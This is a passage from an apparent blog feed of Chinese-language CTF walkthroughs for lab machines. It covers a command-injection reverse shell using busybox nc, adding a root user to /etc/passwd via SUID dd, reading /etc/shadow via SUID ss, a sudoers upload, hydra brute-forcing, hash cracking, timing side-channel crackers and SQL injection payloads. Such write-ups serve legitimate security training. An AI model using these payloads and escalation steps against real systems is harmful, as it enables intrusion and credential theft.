thd = 1000  

def md5chk(w):
    global fnd
    if fnd:
        return
    m = hashlib.md5(w).hexdigest()
    if m == h:
        with threading.Lock():
            if not fnd:
                fnd = True
                print(f'\n[+] 命中: {w.decode().strip()}')
        exit()


with open(f, 'rb') as fd:
    lines = fd.readlines()

print('爆破中...')

def worker(line):
    global fnd
    if not fnd:
        md5chk(line)

ts = []
for line in lines:
    if fnd:
        break
    
    while threading.active_count() &gt; thd:
        pass
    t = threading.Thread(target=worker, args=(line,))
    t.start()
    ts.append(t)


for t in ts:
    t.join()

if not fnd:
    print('\n[-] 未找到匹配项')
```

使用该密码成功切换到 `root` 用户。

```bash
miao@Open:/tmp$ su -
Password: do167watt041
root@Open:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### **四、夺取旗帜**

获取 root 权限后，读取所有旗帜文件。

```bash
root@Open:~# cat /home/miao/user.txt 
flag{user-b026324c6904b2a9cb4b88d6d61c81d1}

root@Open:~# cat /root/root.txt 
flag{root-6cd1f22e65d26246530ff7a2528144e3}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Open.html</guid><pubDate>Wed, 06 Aug 2025 00:51:37 +0000</pubDate></item><item><title>内部_umz</title><link>https://7r1UMPHK.github.io/post/nei-bu-_umz.html</link><description>靶机地址：https://hackmyvm.eu/machines/machine.php?vm=Umz

![image-20250804203716777](http://7r1UMPHK.github.io/image/20250804203743076.webp)

# **一、信息收集**

## 1. 主机发现

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.243`。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.243 08:00:27:9a:39:0d       PCS Systemtechnik GmbH
...
```

## 2. 端口与服务扫描

使用 `nmap` 对目标主机进行全端口扫描，发现其初始开放了 22 (SSH) 和 80 (HTTP) 两个端口。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 08:37 EDT
Nmap scan report for 192.168.205.243
Host is up (0.000099s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 3. Web 服务探索

访问 80 端口是一个静态网页。

![image-20250804203832718](http://7r1UMPHK.github.io/image/20250804203833086.webp)

这贴脸开大，嘲讽我们ddos不行的，就满足他

```
gobuster dir -k -t 200000 -u http://192.168.205.243 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip
```

扫描一波就挂了。

重新进行端口扫描发现，服务端口已从 80 切换到了 8080。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 08:40 EDT
Nmap scan report for 192.168.205.243
Host is up (0.000089s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

访问 `http://192.168.205.243:8080`，发现一个登录页面。

# **二、初始访问**

## 1. 漏洞利用

尝试使用弱口令 `admin:admin` 成功登录后台。后台提供一个 `ping` 功能，测试发现存在命令注入漏洞。通过使用分号 `;` 可以拼接并执行任意系统命令。

```text
Payload: ; id
```

## 2. 获取 Shell

利用该命令注入漏洞，执行反向 Shell 命令，成功在本地 Kali 监听的端口上接收到 Shell。

*   **攻击机（Kali）监听:**
    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ nc -lvnp 8888
    listening on [any] 8888 ...
    ```

*   **Web 页面注入 Payload:**
    ```text
    ;busybox nc 192.168.205.128 8888 -e /bin/bash
    ```

成功获取 `welcome` 用户的 Shell。为方便后续操作，使用 `stty` 将其升级为功能完整的交互式 TTY。

```bash
# 稳定 Shell
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 34 columns 120
```

进入 `welcome` 用户家目录，读取第一个 flag。

```bash
welcome@Umz:~$ cat /home/welcome/user.txt
flag{user-4483f72525b3c316704cf126bec02d5c}
```

# **三、权限提升**

## 1. 横向移动: welcome -&gt; umzyyds

首先，检查当前用户的 `sudo` 权限，发现 `welcome` 用户可以免密执行 `/usr/bin/md5sum`。

```bash
welcome@Umz:~$ sudo -l
User welcome may run the following commands on Umz:
    (ALL) NOPASSWD: /usr/bin/md5sum
```

在系统中进行枚举，于 `/opt/flask-debug/` 目录下发现一个名为 `umz.pass` 的敏感文件。使用 `sudo` 权限读取其 MD5 哈希值。

```bash
welcome@Umz:/opt/flask-debug$ sudo /usr/bin/md5sum umz.pass
a963fadd7fd379f9bc294ad0ba44f659  umz.pass
```

尝试使用 `john` 爆破该哈希值未果。考虑到 Linux 文件常以换行符 `\n` 结尾，这可能会影响哈希计算。使用 `perl` 脚本结合 `rockyou.txt` 字典，在计算哈希时包含换行符，成功破解出密码。

```bash
┌──(kali㉿kali)-[~]
└─$ perl -MDigest::MD5=md5_hex -nE 'print $_ if md5_hex($_) eq 'a963fadd7fd379f9bc294ad0ba44f659'' /usr/share/wordlists/rockyou.txt
sunshine3
```

密码为 `sunshine3`。通过 `ls /home` 发现存在另一个用户 `umzyyds`。使用破解出的密码成功切换到 `umzyyds` 用户。

```bash
welcome@Umz:~$ su umzyyds
Password: sunshine3
umzyyds@Umz:/home/welcome$
```

## 2. 垂直提升: umzyyds -&gt; root

切换到 `umzyyds` 用户后，在其家目录中发现一个拥有 `SUID` 权限的可执行文件 `Dashazi`。

```bash
umzyyds@Umz:~$ ls -al
...
-rwsr-sr-x 1 root    root    76712 May  3 10:42 Dashazi
...
```

使用 `strings` 命令分析该文件，发现其包含了大量与 `dd` 命令相关的字符串，可以断定 `Dashazi` 就是 `dd` 命令的副本。

由于该文件具有 SUID root 权限，任何用户执行它时都将获得 root 身份。我们可以利用它以 root 权限写入系统关键文件，如 `/etc/passwd`，从而创建一个新的 root 用户。

**提权步骤:**

1.  构造一个新的用户条目，用户名为 `b`，密码为`abcdefg`，UID 和 GID 均为 `0` (root 权限)。
2.  使用 `echo` 和管道，将该条目作为 `Dashazi` (dd) 的输入。
3.  指定输出文件 (`of`) 为 `/etc/passwd`，并使用 `oflag=append` 和 `conv=notrunc` 选项以追加模式写入，避免覆盖原文件。

```bash
umzyyds@Umz:~$ echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' | ./Dashazi of=/etc/passwd conv=notrunc oflag=append
0+1 records in
0+1 records out
37 bytes copied, 0.000106 s, 349 kB/s
```

# **四、夺取旗帜**

成功向 `/etc/passwd` 文件中添加了新的 root 用户 `hacker` 后，直接切换到该用户，即可获得 root 权限。

```bash
umzyyds@Umz:~$ su b
Password:
root@Umz:/home/umzyyds# id
uid=0(root) gid=0(root) groups=0(root)
```

最后，读取 `root.txt` 获取最终的 flag，完成渗透。

```bash
root@Umz:/home/umzyyds# cat /root/root.txt /home/welcome/user.txt 
flag{root-a73c45107081c08dd4560206b8ef8205}
flag{user-4483f72525b3c316704cf126bec02d5c}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_umz.html</guid><pubDate>Wed, 06 Aug 2025 00:51:14 +0000</pubDate></item><item><title>内部_tea</title><link>https://7r1UMPHK.github.io/post/nei-bu-_tea.html</link><description># **一、信息收集**

## **1. 主机发现**

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.244`。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.244 08:00:27:9a:e3:28       PCS Systemtechnik GmbH
...
```

## **2. 端口与服务扫描**

使用 `nmap` 对目标主机进行全端口扫描，发现其开放了 22 (SSH) 和 80 (HTTP) 两个端口。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.205.244
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 09:03 EDT
Nmap scan report for 192.168.205.244
Host is up (0.000099s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## **3. Web 服务探索**

访问 80 端口，页面显示一个域名 `tea.dsz`。

![image-20250804210408103](http://7r1UMPHK.github.io/image/20250804210408386.webp)

使用 `gobuster` 进行目录爆破，发现 `/login.php` 页面。

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.205.244 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
...
/login.php            (Status: 200)
/index.html           (Status: 200)
...
```

访问 `http://192.168.205.244/login.php`，发现一个登录页面，提供多种登录方式。

![image-20250804210613846](http://7r1UMPHK.github.io/image/20250804210614066.webp)

尝试了一下弱密码，发现`admin:admin`可以登录

![image-20250804211131383](http://7r1UMPHK.github.io/image/20250804211131627.webp)

提供了四个用户名，其中前三个都是弱密码的用户名，忽略。lingmj是群成员的用户名，目标就是他

那突破点可能就在验证码登录那了

![image-20250804210629005](http://7r1UMPHK.github.io/image/20250804210629245.webp)

# **二、初始访问**

## **1. 漏洞利用：验证码爆破**

页面提示可以使用邮箱和4位验证码进行登录。

*（我们结合一下域名和收集的用户名，得到了lingmj@tea.dsz的邮箱）*

利用此机制，我们使用 Burp Suite 的 Intruder 模块对4位数字验证码进行爆破。

*   **Burp Suite 设置**：
    1.  拦截验证码登录的 POST 请求。
    2.  将请求发送到 Intruder 模块。
    3.  将验证码参数 `code` 设置为爆破点。
    4.  设置 Payload 为数字序列，范围从 0000 到 9999。

![image-20250804211358010](http://7r1UMPHK.github.io/image/20250804211358352.webp)

成功爆破出验证码为 `8379`。使用该验证码成功登录。

### **2. 获取 Shell**

登录后，页面显示了三个用户名（Black, Red, Flower）及其对应的 MD5 哈希密码。

```text
Black
83796a396478e084663c06aa25425864
Red
d390587c3997d1f6b4e4fe968327e3a2
Flower
3c96be08e8b399d1b990f2f5c4939f8b
```

使用在线 MD5 解密工具，成功破解出明文密码：

*   `83796a396478e084663c06aa25425864` -&gt; `1234hak54321`
*   `d390587c3997d1f6b4e4fe968327e3a2` -&gt; `123bugme`
*   `3c96be08e8b399d1b990f2f5c4939f8b` -&gt; `Cartman`

尝试使用这些凭据通过 SSH 登录。用户 `black` 和密码 `1234hak54321` 登录成功。

```bash
┌──(kali㉿kali)-[~]
└─$ ssh black@192.168.205.244
black@192.168.205.244's password:
...
black@Tea:~$ id
uid=1000(black) gid=1000(black) groups=1000(black)
```

登录后，在 `/home/red/` 目录下发现 `user.txt` 文件，并成功读取第一个 flag。

```bash
black@Tea:~$ cat /home/red/user.txt
flag{user-9667c39f-4203-11f0-9e29-000c2955ba04}
```

# **三、权限提升**

## **垂直提升：black -&gt; root**

在 `/opt` 目录下发现一个名为 `check_root_passwd` 的可执行文件。

```bash
black@Tea:~$ ls -al /opt
-rwx--x--x 1 root root 16808 Jun 5 08:07 check_root_passwd
```

执行该程序并提供任意输入，均返回 'Password error'。通过 `time` 命令测试发现，输入特定长度（10位）时，程序的执行时间有显著延迟，这表明存在时间侧信道攻击的可能性。

```bash
black@Tea:/opt$ for len in {1..12}; do inp=$(printf 'a%.0s' $(seq 1 $len)); printf 'Len:%2d -&gt; ' $len; (time ./check_root_passwd '$inp' &gt; /dev/null 2&gt;&amp;1) 2&gt;&amp;1 | grep -o 'real.*'; done
Len: 1 -&gt; real    0m0.000s
...
Len: 9 -&gt; real    0m0.000s
Len:10 -&gt; real    0m0.201s
Len:11 -&gt; real    0m0.000s
Len:12 -&gt; real    0m0.000s
```

基于此发现，可以编写脚本逐位爆破密码。其原理是：程序逐字符比较输入与真实密码，每正确一位，比较时间就会稍长一些。通过测量每个字符的响应时间，可以确定正确的密码。

使用以下 Shell 脚本进行爆破：（这脚本ai写的，巨慢）

```bash
P=''
for p in {0..9}; do
    LOG=/tmp/log.$p
    for c in {a..z}; do
        inp=$(printf '%-10s' '$P$c' | tr ' ' a | cut -c1-10)
        t=$( { time /opt/check_root_passwd '$inp' &gt;/dev/null 2&gt;&amp;1; } 2&gt;&amp;1 | grep real | awk -F'm' '{gsub(/s/,'',$2); print $2}' )
        echo '$c $t' &gt;&gt; $LOG
    done
    B=$(sort -k2 -nr $LOG | head -1 | awk '{print $1}')
    P+='$B'
    echo 'p$p: $B | total: $P'
done
echo '$P'
```

经过爆破，得到 root 密码为 `toddzhennb`。

# **四、夺取旗帜**

使用破解出的密码切换到 `root` 用户。

```bash
black@Tea:/tmp$ su -
Password: toddzhennb
root@Tea:~# id
uid=0(root) gid=0(root) groups=0(root)
```

最后，读取 flag，完成渗透。

```bash
root@Tea:~# cat /root/root.txt /home/red/user.txt 
flag{root-06a5f218-4203-11f0-918d-000c2955ba04}
flag{user-9667c39f-4203-11f0-9e29-000c2955ba04}
```

# 五、题外话

我打完才发现，这靶机群主叫我测试过

然后他的根目录有一个脚本，比我这快多了，想了解一下的看下面

```python
root@Tea:~# cat solve.py 
import subprocess
import sys
import time
import string

TARGET_PROGRAM = './a.out'
MAX_LENGTH = 100
INITIAL_DELAY = 0.2
CHAR_DELAY = 0.05
TIMING_MARGIN = 0.01
ATTEMPTS = 2
DETECT_THRESHOLD = 0.15
CHARSET = string.ascii_lowercase + string.digits

def run_password_test(password):
    start_time = time.perf_counter()
    process = subprocess.Popen(
        [TARGET_PROGRAM, password],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    _, _ = process.communicate()
    return time.perf_counter() - start_time

def detect_length():
    for length in range(1, MAX_LENGTH + 1):
        test_pwd = 'a' * length
        total_time = 0
        for _ in range(ATTEMPTS):
            elapsed = run_password_test(test_pwd)
            total_time += elapsed
        avg_time = total_time / ATTEMPTS
        
        if avg_time &gt;= DETECT_THRESHOLD:
            return length
    
    print('Password length not found (1-100)')
    sys.exit(1)

def crack_password(password_length):
    known = ''
    
    for position in range(password_length):
        max_time = 0
        best_char = None
        
        for char in CHARSET:
            test_pwd = known + char + 'x' * (password_length - len(known) - 1)
            
            current_time = 0
            for _ in range(ATTEMPTS):
                elapsed = run_password_test(test_pwd)
                if elapsed &gt; current_time:
                    current_time = elapsed
            
            print(f'Testing '{char}': {current_time:.4f}s')
            
            if current_time &gt; max_time:
                max_time = current_time
                best_char = char
        
        expected_time = INITIAL_DELAY + (position + 1) * CHAR_DELAY
        if abs(max_time - expected_time) &gt; TIMING_MARGIN:
            print(f'Warning: Position {position} timing anomaly ({max_time:.4f}s vs expected {expected_time:.4f}s)')
        
        known += best_char
        print(f'Progress: {known}')
    
    return known

if __name__ == '__main__':
    print('Starting password cracker...')
    print('Detecting password length...')
    password_length = detect_length()
    print(f'Password length detected: {password_length}')
    password = crack_password(password_length)
    print(f'\nPassword found: {password}')
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_tea.html</guid><pubDate>Wed, 06 Aug 2025 00:50:48 +0000</pubDate></item><item><title>hmv_Thirteen</title><link>https://7r1UMPHK.github.io/post/hmv_Thirteen.html</link><description>&gt; Tip
&gt;
&gt; 靶机地址：https://hackmyvm.eu/machines/machine.php?vm=Thirteen

# **一、信息收集**

## **1. 主机发现**

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.250`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.250 08:00:27:c5:ec:3b       PCS Systemtechnik GmbH
...
```

## **2. 端口与服务扫描**

使用 `nmap` 对目标主机进行全端口扫描，发现其开放了 21 (FTP)、22 (SSH) 和 80 (HTTP) 三个端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.250
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 07:00 EDT
Nmap scan report for 192.168.205.250
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## **3. Web 服务探索**

访问 80 端口，页面显示为一个 'iCloud Secure Vault'，提示输入加密路径来访问文件。页面上有三个链接，其 `href` 属性指向了经过 ROT13 加密的文件名。

*   `?theme=jrypbzr.gkg` -&gt; `?theme=welcome.txt`
*   `?theme=pbasvt.gkg` -&gt; `?theme=config.txt`
*   `?theme=ernqzr.gkg` -&gt; `?theme=readme.txt`

这表明 Web 应用存在本地文件包含 (LFI) 漏洞，通过 ROT13 加密构造 Payload 即可读取任意文件。利用该漏洞读取 `/etc/passwd` 文件，以发现系统上的有效用户。

**ROT13 加密 `/etc/passwd` -&gt; `/rgp/cnffjq`**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.250/?theme=/rgp/cnffjq
...
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
max:x:1001:1001::/home/max:/bin/bash
...
```

从返回内容中，我们识别出两个可登录的用户：`welcome` 和 `max`。

## **4. FTP 服务探索**

使用 `hydra` 和默认凭据字典对 FTP 服务进行爆破，成功获得 `ADMIN` 用户的密码为 `12345`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.205.250 -I -u -f -e nsr -t 64
...
[21][ftp] host: 192.168.205.250   login: ADMIN   password: 12345
...
```

登录 FTP 服务器后，发现 `ftp_server.py` 和 `rev.sh` 两个文件，但这些文件在此次渗透中未提供关键利用点。

# **二、初始访问**

## **1. 漏洞利用：SSH 弱口令爆破**

通过前面 LFI 漏洞访问到的 `welcome.txt` 文件，里面包含一个名字列表。我们将这个列表与之前发现的用户名 (`max`, `welcome`) 结合，使用 `cupp` 工具生成一个针对性的密码字典 `user.cupp.txt`。

随后，使用 `hydra` 对 22 端口的 SSH 服务进行弱口令爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat user
max
welcome
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ hydra -L user -P user.cupp.txt ssh://192.168.205.250 -I -u -e nsr -t 64
...
[22][ssh] host: 192.168.205.250   login: max       password: Ellyas2018
[22][ssh] host: 192.168.205.250   login: welcome   password: Zakaria2020
...
```

爆破成功，获得两组凭据：`max:Ellyas2018` 和 `welcome:Zakaria2020`。

## **2. 获取 Shell**

使用 `max` 用户的凭据通过 SSH 成功登录到目标系统。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh max@192.168.205.250
max@192.168.205.250's password: Ellyas2018
...
max@13max:~$ id
uid=1001(max) gid=1001(max) groups=1001(max)
```

# **三、权限提升**

## **1. 水平提升：max -&gt; welcome**

登录 `max` 账户后，首先查看当前用户权限和系统中的 SUID 文件。

```bash
max@13max:~$ find / -perm -4000 -type f 2&gt;/dev/null
...
/usr/local/bin/supersuid
...
max@13max:~$ ls -la /usr/local/bin/supersuid
-rwsr-sr-- 1 root welcome 161488 Jul  4 10:37 /usr/local/bin/supersuid
```

发现一个名为 `supersuid` 的 SUID 文件，其所有者为 `root`，所属组为 `welcome`。`max` 用户不属于 `welcome` 组，因此无法执行此文件。

利用之前爆破出的 `welcome` 用户密码 `Zakaria2020`，切换到 `welcome` 用户。

```bash
max@13max:~$ su welcome
Password: Zakaria2020
welcome@13max:~$ id
uid=1000(welcome) gid=1000(welcome),1001(max) groups=1000(welcome)
```

成功切换后，在 `welcome` 的家目录中找到并读取 `user.flag`。

```bash
welcome@13max:~$ cat /home/welcome/user.flag
flag{user-a89162ba751904d59ebd8fed2fce8880}
```

## **2. 垂直提升：welcome -&gt; root**

切换到 `welcome` 用户后，我们现在有权限执行 `/usr/local/bin/supersuid`。执行命令之后，根据经验之谈判断`supersuid`其实是`ss`命令的封装，通过查询 GTFOBins ，可知 `ss` 命令在 SUID 上下文中可以被用来读取任意文件。

利用这个特性，读取 `/etc/shadow` 文件，获取 `root` 用户的密码哈希。

```bash
welcome@13max:~$ /usr/local/bin/supersuid -a -F /etc/shadow
Error: an inet prefix is expected rather than 'root:$6$Cax26XI4SpAAItdE$7iVSsRoQT/o0b3.V9jMiljdau506ePGmZLkIl5JH9COngDqdXJkGnizRIhaLJu/JbwWZ.7XyF/MwzuDusZJcg1:20273:0:99999:7:::'.
Cannot parse dst/src address.
```

虽然命令报错，但错误信息中已经泄露了 `root` 用户的哈希值。将哈希保存到本地文件，并使用 `john` 和 `rockyou.txt` 字典进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
april7th         (root)
...
```

成功破解出 `root` 用户的密码为 `april7th`。

最后，使用 `su` 命令和破解的密码切换到 `root` 用户。

```bash
welcome@13max:~$ su -
Password: april7th
root@13max:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# **四、夺取旗帜**

成功获取 `root` 权限后，读取全部 `flag`。

```bash
root@13max:~# cat /root/root.flag /home/welcome/user.flag 
flag{root-aaa245a6e5a82937c985c50c86282892}
flag{user-a89162ba751904d59ebd8fed2fce8880}
```

至此，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Thirteen.html</guid><pubDate>Wed, 06 Aug 2025 00:50:19 +0000</pubDate></item><item><title>内部_Chat</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Chat.html</link><description># **一、信息收集**

## **1. 主机发现**

首先，在本地网络中使用 `arp-scan` 工具扫描存活主机，确定目标靶机的 IP 地址为 `192.168.205.248`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.248 08:00:27:60:fd:c6       PCS Systemtechnik GmbH
...
```

## **2. 端口与服务扫描**

使用 `nmap` 对目标主机进行端口和服务扫描，发现其开放了 22 (ssh-chat)、2222 (OpenSSH) 和 8000 (HTTP) 三个端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p22,2222,8000 -sC -sV 192.168.205.248
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 23:30 EDT
Nmap scan report for 192.168.205.248
Host is up (0.00033s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     (protocol 2.0)
| fingerprint-strings:
|_  NULL: SSH-2.0-Go ssh-chat
2222/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
8000/tcp open  http    Golang net/http server
|_http-title: /
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

*   **22/tcp**: 一个基于 Go 的 `ssh-chat` 服务。
*   **2222/tcp**: 标准的 OpenSSH 服务，是主要的突破口。
*   **8000/tcp**: 一个由 Golang 实现的 HTTP 文件服务器。

### **3. Web 服务探索**

访问 8000 端口，发现是一个文件目录浏览页面。通过页面内容，发现了一个 `.ssh` 目录，这通常存放用户的 SSH 密钥。

在 `.ssh` 目录中，找到了用户的公钥 `authorized_keys` 和私钥 `id_rsa`。将私钥下载到本地，尝试用于后续的登录。

# **二、初始访问**

## **1. 漏洞利用：SSH 弱口令爆破**

首先尝试使用从 Web 服务下载的私钥登录 2222 端口的 SSH 服务，但以失败告终。随后，尝试用同一私钥登录运行在 22 端口的 ssh-chat 服务，这次登录成功了。但在进一步探索中，并未发现其他有价值的线索。值得注意的是，`ssh-chat` 服务的当前用户为 `scycree`，且登录横幅中提到了`todd`，这可能是一个重要提示。

因此，决定对 2222 端口的 SSH 服务进行弱口令爆破。使用 `hydra` 工具，以 `todd` 和 `scycree` 为用户名字典，结合常用密码字典进行爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat user
todd
scycree
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -L user -P 5000q.txt ssh://192.168.205.248:2222 -I -u -f -e nsr -t 64
...
[2222][ssh] host: 192.168.205.248   login: todd   password: todd
...
```

爆破成功，获得用户 `todd` 的密码为 `todd`。

## **2. 获取 Shell**

使用获取的凭据 `todd:todd` 成功通过 SSH 登录到目标系统。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh todd@192.168.205.248 -p 2222
todd@192.168.205.248's password: todd
...
todd@Chat:~$ id
uid=1001(todd) gid=1001(todd) groups=1001(todd)
```

# **三、权限提升**

## **1. 水平提升：todd -&gt; scycree**

登录 `todd` 账户后，发现当前权限较低。的目标是提升至 `root` 权限。注意到系统上还存在另一个用户 `scycree`。尝试爆破 `scycree` 用户的密码。

首先，将本地的密码爆破工具 `suForce` 和字典 `rockyou.txt` 上传到靶机的 `/tmp` 目录。

```bash
todd@Chat:/tmp$ wget 192.168.205.128/suForce
todd@Chat:/tmp$ wget 192.168.205.128/rockyou.txt
todd@Chat:/tmp$ chmod +x suForce
```

然后执行爆破：

```bash
todd@Chat:/tmp$ ./suForce -u scycree -w rockyou.txt
...
💥 Password | welcome
...
```

成功爆破出 `scycree` 用户的密码为 `welcome`。使用 `su` 命令切换到 `scycree` 用户。

```bash
todd@Chat:/tmp$ su scycree
Password: welcome
scycree@Chat:/tmp$ id
uid=1000(scycree) gid=1000(scycree) groups=1000(scycree)
```

## **2. 垂直提升：scycree -&gt; root**

切换到 `scycree` 用户后，执行 `sudo -l` 查看其 `sudo` 权限。

```bash
scycree@Chat:/tmp$ sudo -l
Matching Defaults entries for scycree on Chat:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User scycree may run the following commands on Chat:
    (ALL) NOPASSWD: /usr/bin/ghfs
```

发现 `scycree` 用户可以无密码以 `root` 权限执行 `/usr/bin/ghfs` (Go HTTP File Server)。`ghfs` 带有文件上传功能，这构成了严重的安全漏洞。可以利用这个权限，向 `/etc/sudoers.d/` 目录上传一个恶意的 `sudo` 配置文件，从而授予自己完全的 `root` 权限。

首先，以 `root` 权限启动 `ghfs`，并将其根目录和上传目录都设置为 `/etc/sudoers.d/`。

```bash
scycree@Chat:/tmp$ sudo /usr/bin/ghfs -r /etc/sudoers.d/ --upload-dir /etc/sudoers.d/
```

接着，在本地创建一个文件，内容为赋予 `scycree` 用户所有命令的无密码 `sudo` 权限。

```bash
# 在攻击机上执行
echo 'scycree ALL=(ALL:ALL) NOPASSWD: ALL' &gt; a
```

然后，通过浏览器或 `curl` 访问 `ghfs` 提供的 Web 服务 (`http://192.168.205.248:8080`)，将 `a` 文件上传。

上传成功后，`scycree` 的 `sudo` 权限被更新。此时，再次执行 `sudo -l` 可以看到新增的权限。

```bash
scycree@Chat:/tmp$ sudo -l
...
User scycree may run the following commands on Chat:
    (ALL) NOPASSWD: /usr/bin/ghfs
    (ALL : ALL) NOPASSWD: ALL
```

最后，执行 `sudo bash` 即可获得一个 `root` shell。

```bash
scycree@Chat:/tmp$ sudo bash
root@Chat:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

# **四、夺取旗帜**

成功获取 `root` 权限后，读取位于 `/root` 目录下的最终 `flag`。

```bash
root@Chat:/tmp# cat /root/root.txt
flag{root-c448ebd8ddef14820eef632ffe833f3c}
```

至此，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Chat.html</guid><pubDate>Wed, 06 Aug 2025 00:49:56 +0000</pubDate></item><item><title>内部_SingDanceRap</title><link>https://7r1UMPHK.github.io/post/nei-bu-_SingDanceRap.html</link><description># **一、信息收集**

## **1. 主机与服务发现**

首先，在本地网络中使用 `arp-scan` 扫描存活主机，确定目标靶机IP地址为 `192.168.205.245`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.245 08:00:27:82:68:fa       PCS Systemtechnik GmbH
...
```

接着，使用 `nmap` 对目标主机进行全端口扫描，发现其开放了 22 (SSH) 和 80 (HTTP) 端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.245
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 10:09 EDT
Nmap scan report for 192.168.205.245
Host is up (0.0013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

## **2. Web服务探索与SQL注入**

访问80端口，发现是一个新闻网站。网站内的链接 `http://192.168.205.245/news.php?title=...` 存在明显的GET参数，这通常是漏洞的切入点。

使用 `sqlmap` 对 `title` 参数进行测试，迅速确认存在SQL注入漏洞。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u 'http://192.168.205.245/news.php?title=1' --batch
...
---
Parameter: title (GET)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=1' AND (SELECT 4710 FROM (SELECT(SLEEP(5)))shBD) AND 'ceXN'='ceXN

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: title=1' UNION ALL SELECT NULL,CONCAT(0x71627a6271,...),NULL-- -
---
[10:14:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
...
```

`sqlmap` 确认后台数据库为MySQL，并且该注入点为DBA权限。

# **二、初始访问**

## **1. 漏洞利用：从SQL注入到后台源码泄露**

